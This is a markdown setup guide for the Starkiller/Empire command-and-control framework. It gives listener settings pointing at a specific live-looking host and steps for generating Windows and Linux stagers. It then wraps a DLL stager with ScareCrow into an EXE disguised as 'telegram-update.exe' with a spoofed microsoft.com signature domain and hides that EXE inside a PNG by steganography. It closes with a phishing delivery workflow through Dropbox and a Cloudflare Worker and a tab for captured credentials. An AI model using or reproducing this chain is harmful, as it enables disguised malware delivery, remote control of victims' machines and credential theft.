# 🎯 Starkiller Setup Guide

## 🌐 Access Starkiller

**URL**: https://161-35-155-3.sslip.io

## 🔐 Login

1. Open Starkiller in your browser (already done)
2. You'll see the Starkiller login page
3. **Default credentials**:
   - URL: `https://161-35-155-3.sslip.io:1337` or `http://127.0.0.1:1337`
   - Username: `empireadmin`
   - Password: `password123`

## 📡 Create HTTP Listener

1. Click **Listeners** in left sidebar
2. Click **Create** button
3. Select **HTTP**
4. Configure:
   ```
   Name: main_http
   Host: https://161-35-155-3.sslip.io
   Port: 443
   BindIP: 0.0.0.0
   DefaultProfile: /admin/get.php,/news.php,/login/process.php|Mozilla/5.0
   ```
5. Click **Submit**

## 🎯 Generate Stagers

### Windows PowerShell Launcher
1. Click **Stagers** in left sidebar
2. Select **windows/launcher_bat**
3. Set **Listener**: `main_http`
4. Set **OutFile**: Leave blank or specify path
5. Click **Generate**
6. Copy output and save as `launcher.bat`

### Windows DLL (for ScareCrow)
1. Select **windows/dll**
2. Set **Listener**: `main_http`
3. Click **Generate**
4. Save output as `empire.dll`

### Multi/Bash
1. Select **multi/bash**
2. Set **Listener**: `main_http`
3. Click **Generate**
4. Save as `launcher.sh` for Linux targets

## 📂 Save Stagers

Save all stagers to:
```
/home/kali/Main C2 Framework/advanced-steganography-phishing/stagers/
```

## 🔗 Integration with ScareCrow

Once you have `empire.dll`:

```bash
cd /home/kali/ScareCrow

./ScareCrow \
  -I "/home/kali/Main C2 Framework/advanced-steganography-phishing/stagers/empire.dll" \
  -Loader binary \
  -domain microsoft.com \
  -O "/home/kali/Main C2 Framework/advanced-steganography-phishing/payloads/telegram-update.exe"
```

## 🖼️ Embed in Steganography

```bash
cd /home/kali/Main\ C2\ Framework/advanced-steganography-phishing

python3 large-stego-system.py embed \
  --payload payloads/telegram-update.exe \
  --carrier-image images/telegram-hero.png \
  --output output/telegram-hero-payload.png
```

## ✅ Verification

### Check Listener Status
- In Starkiller, go to **Listeners**
- Status should show **Active**

### Test Agent Check-in
1. Generate a test stager
2. Run in controlled VM
3. Watch **Agents** tab for check-in
4. Initial callback should appear within 30 seconds

## 🎯 Complete Workflow

```
1. Create Listener (main_http) ✓
   ↓
2. Generate DLL Stager ✓
   ↓
3. Process with ScareCrow → EXE
   ↓
4. Embed in Image → Stego Image
   ↓
5. Upload to Dropbox
   ↓
6. Deploy Cloudflare Worker
   ↓
7. Test Attack Chain
   ↓
8. Monitor Agents in Starkiller
```

## 📱 Starkiller Tips

- **Agents Tab**: See all active agents
- **Listeners Tab**: Manage C2 listeners
- **Stagers Tab**: Generate payloads
- **Modules Tab**: Post-exploitation modules
- **Credentials Tab**: Captured credentials
- **Reporting Tab**: Generate reports

## 🔒 Security Notes

- Change default password immediately
- Use HTTPS only for production
- Configure proper access controls
- Monitor logs regularly
- Implement kill-switch mechanisms

---

**Current Status**: Starkiller is accessible and ready to use!

**Next Action**: Login and create your first listener
